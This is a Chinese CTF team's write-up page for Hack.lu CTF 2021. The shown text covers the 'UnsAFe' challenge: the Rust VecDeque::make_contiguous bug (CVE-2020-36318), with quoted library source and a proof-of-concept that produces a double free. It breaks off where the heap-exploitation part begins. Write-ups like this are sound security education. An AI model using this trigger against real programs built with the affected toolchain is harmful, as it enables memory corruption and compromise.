<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <title>Hack.lu CTF 2021 Writeup | r3kapig</title>
    <meta property="og:title" content="r3kapig writeup" />
    <meta property="og:locale" content="en_US" />
    <meta name="description" content="Writeup for Hack.lu CTF 2021 Writeup" />
    <meta property="og:description" content="Writeup for Hack.lu CTF 2021 Writeup" />
    <link rel="canonical" href="https://r3kapig.com/writeup/" />
    <meta property="og:url" content="https://r3kapig.com/writeup/" />
    <meta property="og:site_name" content="r3kapig" />
    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
  </head>
  <style>
  body {
      padding-top: 56px;
  }

  .sticky-offset {
      top: 56px;
  }

  #body-row {
      margin-left:0;
      margin-right:0;
  }
  #sidebar-container {
      min-height: 100vh;   
      background-color: #333;
      padding: 0;
  }

  /* Sidebar sizes when expanded and expanded */
  .sidebar-expanded {
      width: 230px;
  }
  .sidebar-collapsed {
      width: 60px;
  }

  /* Menu item*/
  #sidebar-container .list-group a {
      min-height: 50px;
      color: white;
  }

  /* Submenu item*/
  #sidebar-container .list-group .sidebar-submenu a {
      min-height: 45px;
      padding-left: 60px;
  }
  .sidebar-submenu {
      font-size: 0.9rem;
  }

  /* Separators */
  .sidebar-separator-title {
      background-color: #333;
      height: 35px;
  }
  .sidebar-separator {
      background-color: #333;
      height: 25px;
  }
  .logo-separator {
      background-color: #333;    
      height: 60px;
  }


  /* 
   active scrollspy
  */
  .list-group-item.active {
    border-color: transparent;
    border-left: #e69138 solid 4px;
  }

  /* 
   anchor padding top
   https://stackoverflow.com/a/28824157
  */
  :target:before {
    content:"";
    display:block;
    height:56px; /* fixed header height*/
    margin:-56px 0 0; /* negative fixed header height */
  }
  </style>
  
  <script>
  // https://stackoverflow.com/a/48330533
  $(window).on('activate.bs.scrollspy', function (event) {
    let active_collapse = $($('.list-group-item.active').parents()[0]);
    $(".collapse").removeClass("show");
    active_collapse.addClass("show");

    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
    $('a[href^="#submenu"]').css("border-left", "");
    parent_menu.css("border-left","#e69138 solid 4px");
  });

  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$','$'], ['\\(','\\)']],
      processEscapes: true
    }
  });
  </script>

  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <a class="navbar-brand" href="../">
        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
        <span class="menu-collapsed">r3kapig / writeup</span>
      </a>
      <div class="collapse navbar-collapse" id="navbarNavDropdown">
        <ul class="navbar-nav my-2 my-lg-0">
            
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                前言
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                pwn
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#unsafemid">unsafemid</a>
    
                <a class="dropdown-item" href="#stonks-sockethigh">stonks-sockethigh</a>
    
                <a class="dropdown-item" href="#cloudinspectmid">cloudinspectmid</a>
    
                <a class="dropdown-item" href="#secure-prototypelow">secure-prototypelow</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                web
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#trading-apihigh">trading-apihigh</a>
    
                <a class="dropdown-item" href="#diamond-safemid">diamond-safemid</a>
    
                <a class="dropdown-item" href="#nodenblow">nodenblow</a>
    
                <a class="dropdown-item" href="#seekingexploitshigh">seekingexploitshigh</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                reverse
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#atareeelow">atareeelow</a>
    
                <a class="dropdown-item" href="#ollvm-high">ollvm-high</a>
    
                <a class="dropdown-item" href="#pycoinlow">pycoinlow</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                crypto
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#silver-water-industrieslow">silver-water-industrieslow</a>
    
                <a class="dropdown-item" href="#whattheheccmid">whattheheccmid</a>
    
                <a class="dropdown-item" href="#lwsrmid">lwsrmid</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                misc
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#tenbaggernone">tenbaggernone</a>
    
                <a class="dropdown-item" href="#touchy-loggerlow">touchy-loggerlow</a>
    
              </div>
            </li>
    
        </ul>
      </div>
      <div class="order-3 dual-collapse2"> <!-- navbar-collapse w100 collapse -->
        <ul class="navbar-nav ml-auto" style="flex-direction: row;">
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
        </ul>
      </div>
    </nav>
    <div class="row" id="body-row">
      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
        <ul class="list-group sticky-top sticky-offset">
          
          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">前言</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu0" class="collapse sidebar-submenu">
            
          </div>
    
          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">pwn</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu1" class="collapse sidebar-submenu">
            <a href="#unsafemid" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">unsafemid</span>
            </a>
    
<a href="#stonks-sockethigh" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">stonks-sockethigh</span>
            </a>
    
<a href="#cloudinspectmid" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">cloudinspectmid</span>
            </a>
    
<a href="#secure-prototypelow" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">secure-prototypelow</span>
            </a>
    
          </div>
    
          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">web</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu2" class="collapse sidebar-submenu">
            <a href="#trading-apihigh" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">trading-apihigh</span>
            </a>
    
<a href="#diamond-safemid" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">diamond-safemid</span>
            </a>
    
<a href="#nodenblow" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">nodenblow</span>
            </a>
    
<a href="#seekingexploitshigh" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">seekingexploitshigh</span>
            </a>
    
          </div>
    
          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">reverse</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu3" class="collapse sidebar-submenu">
            <a href="#atareeelow" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">atareeelow</span>
            </a>
    
<a href="#ollvm-high" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">ollvm-high</span>
            </a>
    
<a href="#pycoinlow" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">pycoinlow</span>
            </a>
    
          </div>
    
          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">crypto</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu4" class="collapse sidebar-submenu">
            <a href="#silver-water-industrieslow" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">silver-water-industrieslow</span>
            </a>
    
<a href="#whattheheccmid" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">whattheheccmid</span>
            </a>
    
<a href="#lwsrmid" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">lwsrmid</span>
            </a>
    
          </div>
    
          <a href="#submenu5" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">misc</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu5" class="collapse sidebar-submenu">
            <a href="#tenbaggernone" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">tenbaggernone</span>
            </a>
    
<a href="#touchy-loggerlow" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">touchy-loggerlow</span>
            </a>
    
          </div>
    
        </ul>
      </div>
      <div class="col-10 py-3">
        <article class="markdown-body"><h1 id="hacklu-ctf-2021-writeup"><a class="header-link" href="#hacklu-ctf-2021-writeup"></a>Hack.lu CTF 2021 Writeup</h1>
<h2 id="前言"><a class="header-link" href="#前言"></a>前言</h2>
<p>本次比赛我们获得了第五名的成绩</p>
<p class="img-container"><img src="https://i.imgur.com/HDBtpK4.png" alt=""></p>
<p>现将师傅们的 wp 整理如下，分享给大家一起学习进步~ 同时也欢迎各位大佬加入 r3kapig 的大家庭，大家一起学习进步，相互分享~ 简历请投战队邮箱：<a href="mailto:&#114;&#x6f;&#111;&#x74;&#x40;&#x72;&#x33;&#107;&#x61;&#x70;&#105;&#x67;&#46;&#99;&#x6f;&#109;">&#114;&#x6f;&#111;&#x74;&#x40;&#x72;&#x33;&#107;&#x61;&#x70;&#105;&#x67;&#46;&#99;&#x6f;&#109;</a></p>
<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
<h3 id="unsafemid"><a class="header-link" href="#unsafemid"></a>UnsAFe(Mid)</h3>
<p>可能写得有些啰嗦 但是算是完整记录了这个题目 师傅们凑合看看</p>
<h4 id="简述"><a class="header-link" href="#简述"></a>简述</h4>
<p>这道题的考察点就是 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36318">Rust CVE</a> + 堆风水操控。其中 Rust 标准库中 <code>VecDeque</code> 的漏洞比较有意思，下面也会重点讲该漏洞的成因和利用方法</p>
<h4 id="功能"><a class="header-link" href="#功能"></a>功能</h4>
<p>程序开头先初始化了几个变量，这些变量接下来也会用到。</p>
<p>下面是它们的类型（有调试信息可以直接找到）：</p>
<pre class="hljs"><code><span class="hljs-keyword">self</span>.pws: HashMap&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">String</span>, RandomState&gt; 
highlighted_tast.q: <span class="hljs-built_in">Box</span>&lt;<span class="hljs-built_in">Vec</span>&lt;<span class="hljs-built_in">String</span>&gt;&gt;;
task_queue.q:VecDeque&lt;BoxVec&lt;alloc::string::<span class="hljs-built_in">String</span>&gt;&gt;&gt;</code></pre><p>分析结果:</p>
<p>0 功能是向 <code>PasswordManager</code> 的 hashmap 中添加一个 key-value</p>
<p>1 功能是通过输入 key，来在 hashmap 中查找 value</p>
<p>2 功能是修改键值对，但是如果 insert 时的 str 长度 &gt; 需要替换的 str，则会插入，否则会替换</p>
<p>3 输入 task 数量，然后对每个 task 要输入 elem （String）数量，对每个 String 要输入长度和内容，最后 <code>push_back</code> 到 <code>TaskDeque</code> 中</p>
<p>4 功能是用 <code>pop_front</code> 从 3 中 <code>TaskQueue</code> 取一个 <code>Vec&lt;String&gt; q</code>，然后 <code>highlighted_task-&gt;q = q</code></p>
<p>5 功能是修改 <code>highlighted_task</code> 中的 vec，给定需要修改的 idx 和新内容进行修改 ，会存在和 2 功能一样的问题</p>
<p>6 功能是通过输入 idx 获取 highlighted_task 中的 value</p>
<p>7 功能是向 highlighted_task 添加（push）一个 value</p>
<h4 id="漏洞："><a class="header-link" href="#漏洞："></a>漏洞：</h4>
<p>找到了一个漏洞：<a href="https://github.com/rust-lang/rust/issues/79808">VecDeque: length 0 underflow and bogus values from pop_front(), triggered by a certain sequence of reserve(), push_back(), make_contiguous(), pop_front()</a>，存在于 1.48.0 版本的 <code>VecDeque&lt;T&gt;::make_contiguous</code> 函数中。</p>
<p>查找字符串可以找到编译器的版本:</p>
<p class="img-container"><img src="https://i.imgur.com/XZ2Hzgw.png" alt=""></p>
<p>在 <code>unsafe::TaskQueue::push_back::haa04777951b4543a</code> 函数中也调用了 <code>make_contiguous</code></p>
<p class="img-container"><img src="https://i.imgur.com/hVAK2Ro.png" alt=""></p>
<p>对上了！下面就来研究一下这个漏洞。</p>
<p>安装 rust 1.48 及其源码：</p>
<pre class="hljs"><code>$ rustup install 1.48
$ rustup +1.48 component add rust-src</code></pre><p>找到对应 patch：<a href="https://github.com/rust-lang/rust/pull/79814/files">fix soundness issue in <code>make_contiguous</code> #79814</a></p>
<h4 id="vecdeque-的内部表示"><a class="header-link" href="#vecdeque-的内部表示"></a>VecDeque 的内部表示</h4>
<p>结构体：</p>
<ul class="list">
<li>.rustup/toolchains/1.48-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/alloc/src/collections/vec_deque.rs</li>
</ul>
<pre class="hljs"><code>    <span class="hljs-keyword">pub</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VecDeque</span></span>&lt;T&gt; {
        <span class="hljs-comment">// tail and head are pointers into the buffer. Tail always points</span>
        <span class="hljs-comment">// to the first element that could be read, Head always points</span>
        <span class="hljs-comment">// to where data should be written.</span>
        <span class="hljs-comment">// If tail == head the buffer is empty. The length of the ringbuffer</span>
        <span class="hljs-comment">// is defined as the distance between the two.</span>
        tail: <span class="hljs-built_in">usize</span>,
        head: <span class="hljs-built_in">usize</span>,
        buf: RawVec&lt;T&gt;,
    }</code></pre><p>这里借用 <strong><a href="https://gts3.org/2019/cve-2018-1000657.html">Analysis of CVE-2018-1000657: OOB write in Rust&#39;s VecDeque::reserve()</a></strong> 中的图示：</p>
<p class="img-container"><img src="https://gts3.org/blog/cve-2018-1000657.assets/ring-buffer.png" alt=""></p>
<p>poc:</p>
<p><a href="https://github.com/rust-lang/rust/issues/79808#issuecomment-740188680">https://github.com/rust-lang/rust/issues/79808#issuecomment-740188680</a></p>
<p>修改 <code>VecDeque&lt;int&gt;</code> 为 <code>VecDeque&lt;String&gt;</code>：</p>
<ul class="list">
<li>poc.rs</li>
</ul>
<pre class="hljs"><code>  <span class="hljs-keyword">use</span> std::collections::VecDeque;
  
  <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">ab</span></span>(dq: &amp;<span class="hljs-keyword">mut</span> VecDeque&lt;<span class="hljs-built_in">String</span>&gt;, sz: <span class="hljs-built_in">usize</span>) {
      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..sz {
          <span class="hljs-keyword">let</span> string = (i).to_string();
          dq.push_back(string);
      }
      dq.make_contiguous();
      <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..sz {
          dq.pop_front();
      }
  }
  
  <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">ab_1</span></span>(dq: &amp;<span class="hljs-keyword">mut</span> VecDeque&lt;<span class="hljs-built_in">String</span>&gt;, sz: <span class="hljs-built_in">usize</span>) {
      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..sz {
          <span class="hljs-keyword">let</span> string = (i).to_string();
          dq.push_back(string);
      }
      <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..sz {
          dq.pop_front();
      }
  }
  
  <span class="hljs-comment">// let free = self.tail - self.head;</span>
  <span class="hljs-comment">// let tail_len = cap - self.tail;</span>
  
  <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() {
      <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> dq = VecDeque::new(); <span class="hljs-comment">// 默认capacity为7</span>
      ab_1(&amp;<span class="hljs-keyword">mut</span> dq, <span class="hljs-number">2</span>);
      ab(&amp;<span class="hljs-keyword">mut</span> dq, <span class="hljs-number">7</span>);
      
      dbg!(dq.len()); <span class="hljs-comment">// this is zero</span>
      
      dbg!(dq.pop_front()); <span class="hljs-comment">// uaf+double frees</span>
  }</code></pre><p>编译并运行：</p>
<pre class="hljs"><code>$ rustc poc.rs
$ ./poc 
[poc.rs:32] dq.len() = 0
[poc.rs:34] dq.pop_front() = Some(
    <span class="hljs-string">&quot;@&quot;</span>,
)
free(): double free detected <span class="hljs-keyword">in</span> tcache 2
Aborted</code></pre><p>发生了 double free</p>
<p>patch:</p>
<p><a href="https://github.com/rust-lang/rust/issues/80293">https://github.com/rust-lang/rust/issues/80293</a></p>
<p>漏洞的成因：</p>
<p class="img-container"><img src="https://i.imgur.com/OBQ7DUU.png" alt=""></p>
<p class="img-container"><img src="https://i.imgur.com/0EoJVuM.png" alt=""></p>
<h4 id="vecdequetmake_contiguous"><a class="header-link" href="#vecdequetmake_contiguous"></a>VecDeque&lt;T&gt;::make_contiguous</h4>
<p><code>make_contiguous</code> 的作用是使 <code>VecDeque</code> 的元素变得连续，这样就可以调用 <code>as_slice</code> 等方法获得 <code>VecDeque</code> 的切片。</p>
<p>接下来结合源码、POC 和 Patch 画图分析： </p>
<p>首先创建 capacity 为 3 的 VecDeque：<code>let mut dq = VecDeque::with_capacity(3);</code></p>
<p class="img-container"><img src="https://i.imgur.com/RkvBud1.png" alt=""></p>
<p>然后 <code>dq.push_back(val);</code> 两次，<code>dq.pop_front();</code> 两次：</p>
<p class="img-container"><img src="https://i.imgur.com/nrLSqs5.png" alt=""></p>
<p>然后再依次 <code>push_back</code> a、b、c：</p>
<p class="img-container"><img src="https://i.imgur.com/oY4eaco.jpg" alt=""></p>
<p>此时调用 <code>dq.make_contiguous();</code>：</p>
<p>此时 <code>self.tail == 2, self.head == 1, free == 1, tail_len == , len == 3</code></p>
<p>执行流程会走入 <code>else if free &gt;= self.head</code></p>
<ul class="list">
<li><code>make_contiguous</code></li>
</ul>
<pre class="hljs"><code>  <span class="hljs-meta">#[stable(feature = <span class="hljs-meta-string">&quot;deque_make_contiguous&quot;</span>, since = <span class="hljs-meta-string">&quot;1.48.0&quot;</span>)]</span>
      <span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">make_contiguous</span></span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) -&gt; &amp;<span class="hljs-keyword">mut</span> [T] {
          <span class="hljs-keyword">if</span> <span class="hljs-keyword">self</span>.is_contiguous() {
              <span class="hljs-keyword">let</span> tail = <span class="hljs-keyword">self</span>.tail;
              <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">self</span>.head;
              <span class="hljs-keyword">return</span> <span class="hljs-keyword">unsafe</span> { &amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>.buffer_as_mut_slice()[tail..head] };
          }
  
          <span class="hljs-keyword">let</span> buf = <span class="hljs-keyword">self</span>.buf.ptr();
          <span class="hljs-keyword">let</span> cap = <span class="hljs-keyword">self</span>.cap();
          <span class="hljs-keyword">let</span> len = <span class="hljs-keyword">self</span>.len();
  
          <span class="hljs-keyword">let</span> free = <span class="hljs-keyword">self</span>.tail - <span class="hljs-keyword">self</span>.head;
          <span class="hljs-keyword">let</span> tail_len = cap - <span class="hljs-keyword">self</span>.tail;
  
          <span class="hljs-keyword">if</span> free &gt;= tail_len {
              <span class="hljs-comment">// there is enough free space to copy the tail in one go,</span>
              <span class="hljs-comment">// this means that we first shift the head backwards, and then</span>
              <span class="hljs-comment">// copy the tail to the correct position.</span>
              <span class="hljs-comment">//</span>
              <span class="hljs-comment">// from: DEFGH....ABC</span>
              <span class="hljs-comment">// to:   ABCDEFGH....</span>
              <span class="hljs-keyword">unsafe</span> {
                  ptr::copy(buf, buf.add(tail_len), <span class="hljs-keyword">self</span>.head);
                  <span class="hljs-comment">// ...DEFGH.ABC</span>
                  ptr::copy_nonoverlapping(buf.add(<span class="hljs-keyword">self</span>.tail), buf, tail_len);
                  <span class="hljs-comment">// ABCDEFGH....</span>
  
                  <span class="hljs-keyword">self</span>.tail = <span class="hljs-number">0</span>;
                  <span class="hljs-keyword">self</span>.head = len;
              }
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> free &gt;= <span class="hljs-keyword">self</span>.head {
              <span class="hljs-comment">// there is enough free space to copy the head in one go,</span>
              <span class="hljs-comment">// this means that we first shift the tail forwards, and then</span>
              <span class="hljs-comment">// copy the head to the correct position.</span>
              <span class="hljs-comment">//</span>
              <span class="hljs-comment">// from: FGH....ABCDE</span>
              <span class="hljs-comment">// to:   ...ABCDEFGH.</span>
              <span class="hljs-keyword">unsafe</span> {
                  ptr::copy(buf.add(<span class="hljs-keyword">self</span>.tail), buf.add(<span class="hljs-keyword">self</span>.head), tail_len);
                  <span class="hljs-comment">// FGHABCDE....</span>
                  ptr::copy_nonoverlapping(buf, buf.add(<span class="hljs-keyword">self</span>.head + tail_len), <span class="hljs-keyword">self</span>.head);
                  <span class="hljs-comment">// ...ABCDEFGH.</span>
  
                  <span class="hljs-keyword">self</span>.tail = <span class="hljs-keyword">self</span>.head;
                  <span class="hljs-keyword">self</span>.head = <span class="hljs-keyword">self</span>.tail + len;
              }
          } <span class="hljs-keyword">else</span> {
              <span class="hljs-comment">// free is smaller than both head and tail,</span>
              <span class="hljs-comment">// this means we have to slowly &quot;swap&quot; the tail and the head.</span>
              <span class="hljs-comment">//</span>
              <span class="hljs-comment">// from: EFGHI...ABCD or HIJK.ABCDEFG</span>
              <span class="hljs-comment">// to:   ABCDEFGHI... or ABCDEFGHIJK.</span>
              <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> left_edge: <span class="hljs-built_in">usize</span> = <span class="hljs-number">0</span>;
              <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> right_edge: <span class="hljs-built_in">usize</span> = <span class="hljs-keyword">self</span>.tail;
              <span class="hljs-keyword">unsafe</span> {
                  <span class="hljs-comment">// The general problem looks like this</span>
                  <span class="hljs-comment">// GHIJKLM...ABCDEF - before any swaps</span>
                  <span class="hljs-comment">// ABCDEFM...GHIJKL - after 1 pass of swaps</span>
                  <span class="hljs-comment">// ABCDEFGHIJM...KL - swap until the left edge reaches the temp store</span>
                  <span class="hljs-comment">//                  - then restart the algorithm with a new (smaller) store</span>
                  <span class="hljs-comment">// Sometimes the temp store is reached when the right edge is at the end</span>
                  <span class="hljs-comment">// of the buffer - this means we&#x27;ve hit the right order with fewer swaps!</span>
                  <span class="hljs-comment">// E.g</span>
                  <span class="hljs-comment">// EF..ABCD</span>
                  <span class="hljs-comment">// ABCDEF.. - after four only swaps we&#x27;ve finished</span>
                  <span class="hljs-keyword">while</span> left_edge &lt; len &amp;&amp; right_edge != cap {
                      <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> right_offset = <span class="hljs-number">0</span>;
                      <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> left_edge..right_edge {
                          right_offset = (i - left_edge) % (cap - right_edge);
                          <span class="hljs-keyword">let</span> src: <span class="hljs-built_in">isize</span> = (right_edge + right_offset) <span class="hljs-keyword">as</span> <span class="hljs-built_in">isize</span>;
                          ptr::swap(buf.add(i), buf.offset(src));
                      }
                      <span class="hljs-keyword">let</span> n_ops = right_edge - left_edge;
                      left_edge += n_ops;
                      right_edge += right_offset + <span class="hljs-number">1</span>;
                  }
  
                  <span class="hljs-keyword">self</span>.tail = <span class="hljs-number">0</span>;
                  <span class="hljs-keyword">self</span>.head = len;
              }
          }
  
          <span class="hljs-keyword">let</span> tail = <span class="hljs-keyword">self</span>.tail;
          <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">self</span>.head;
          <span class="hljs-keyword">unsafe</span> { &amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>.buffer_as_mut_slice()[tail..head] }
      }</code></pre><p>结果：</p>
<p class="img-container"><img src="https://i.imgur.com/9qQatkX.png" alt=""></p>
<p><code>self.head</code> 直接 out of bound 了，而且还多出一个 c 元素的克隆。</p>
<p>再来看看 <code>pop_front</code> ：</p>
<ul class="list">
<li><code>pop_front</code> &amp; <code>is_empty</code></li>
</ul>
<pre class="hljs"><code>  <span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">pop_front</span></span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) -&gt; <span class="hljs-built_in">Option</span>&lt;T&gt; {
          <span class="hljs-keyword">if</span> <span class="hljs-keyword">self</span>.is_empty() {
              <span class="hljs-literal">None</span>
          } <span class="hljs-keyword">else</span> {
              <span class="hljs-keyword">let</span> tail = <span class="hljs-keyword">self</span>.tail;
              <span class="hljs-keyword">self</span>.tail = <span class="hljs-keyword">self</span>.wrap_add(<span class="hljs-keyword">self</span>.tail, <span class="hljs-number">1</span>);
              <span class="hljs-keyword">unsafe</span> { <span class="hljs-literal">Some</span>(<span class="hljs-keyword">self</span>.buffer_read(tail)) }
          }
      }
  <span class="hljs-comment">// ...</span>
  <span class="hljs-meta">#[stable(feature = <span class="hljs-meta-string">&quot;rust1&quot;</span>, since = <span class="hljs-meta-string">&quot;1.0.0&quot;</span>)]</span>
  <span class="hljs-keyword">impl</span>&lt;T&gt; <span class="hljs-built_in">ExactSizeIterator</span> <span class="hljs-keyword">for</span> Iter&lt;<span class="hljs-symbol">&#x27;_</span>, T&gt; {
      <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">is_empty</span></span>(&amp;<span class="hljs-keyword">self</span>) -&gt; <span class="hljs-built_in">bool</span> {
          <span class="hljs-keyword">self</span>.head == <span class="hljs-keyword">self</span>.tail
      }
  }</code></pre><p><code>self.head</code> 永远不会等于 <code>self.tail</code> 了。。。此时如果不断调用 <code>dq.pop_front();</code> ，就会产生下面的无限循环序列：</p>
<pre class="hljs"><code>a b c c a b c c ...</code></pre><p>假如 <code>VecDeque</code> 的元素是分配在堆上的话，我们就有了 UAF/double free 的能力</p>
<h4 id="利用"><a class="header-link" href="#利用"></a>利用</h4>
<p>搞清楚漏洞的成因后，接下来就是搞一些堆风水的 dirty work，控制 <code>highlighted_task</code>，得到任意地址读写的能力。</p>
